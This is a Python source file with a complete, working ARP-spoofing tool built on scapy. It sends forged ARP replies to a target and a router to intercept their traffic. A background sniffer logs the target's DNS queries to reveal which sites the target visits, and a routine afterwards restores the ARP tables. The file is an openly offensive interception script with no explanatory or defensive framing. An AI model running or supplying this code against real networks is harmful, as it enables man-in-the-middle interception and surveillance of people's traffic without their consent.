import scapy.all as scapy
import sys
import time
import threading

class ArpSpoofer:
    def __init__(self, router_ip, target_ip):
        self.router_ip = router_ip
        self.target_ip = target_ip
        # Discovery with retries
        self.router_mac = self.get_mac_robust(router_ip)
        self.target_mac = self.get_mac_robust(target_ip)

    def get_mac_robust(self, ip_address, retries=3):
        """Attempts to discover MAC address multiple times."""
        for i in range(retries):
            broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
            arp_layer = scapy.ARP(pdst=ip_address)
            get_mac_packet = broadcast_layer/arp_layer
            answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
            
            if answer:
                return answer[0][1].hwsrc
            print(f"[*] Attempt {i+1}: No response from {ip_address}...")
        
        print(f"[-] Critical: Could not find MAC for {ip_address}.")
        sys.exit()

    def spoof(self):
        """Sends forged packets."""
        packet1 = scapy.ARP(op=2, hwdst=self.router_mac, pdst=self.router_ip, psrc=self.target_ip)
        packet2 = scapy.ARP(op=2, hwdst=self.target_mac, pdst=self.target_ip, psrc=self.router_ip)
        scapy.send(packet1, verbose=False)
        scapy.send(packet2, verbose=False)

    def process_sniffed_packet(self, packet):
        """Logs specific traffic (e.g., HTTP or DNS)."""
        if packet.haslayer(scapy.IP):
            # Example: Log DNS queries to see what sites they visit
            if packet.haslayer(scapy.DNSQR):
                print(f"[DNS Query] {packet[scapy.IP].src} is looking for: {packet[scapy.DNSQR].qname.decode()}")

    def start_sniffing(self):
        """Starts a packet sniffer in a separate thread."""
        print("[*] Sniffer started. Monitoring DNS traffic...")
        scapy.sniff(iface=None, store=False, prn=self.process_sniffed_packet)

    def start(self):
        """Main loop: Runs spoofing and sniffing simultaneously."""
        # Run sniffing in the background so it doesn't block the spoofing loop
        sniff_thread = threading.Thread(target=self.start_sniffing, daemon=True)
        sniff_thread.start()

        print(f"[+] Spoofing active...")
        try:
            while True:
                self.spoof()
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore()

    def restore(self):
        """Cleanly restores ARP tables."""
        packet1 = scapy.ARP(op=2, hwdst=self.router_mac, pdst=self.router_ip, psrc=self.target_ip, hwsrc=self.target_mac)
        packet2 = scapy.ARP(op=2, hwdst=self.target_mac, pdst=self.target_ip, psrc=self.router_ip, hwsrc=self.router_mac)
        scapy.send(packet1, count=4, verbose=False)
        scapy.send(packet2, count=4, verbose=False)
        print("[+] Done.")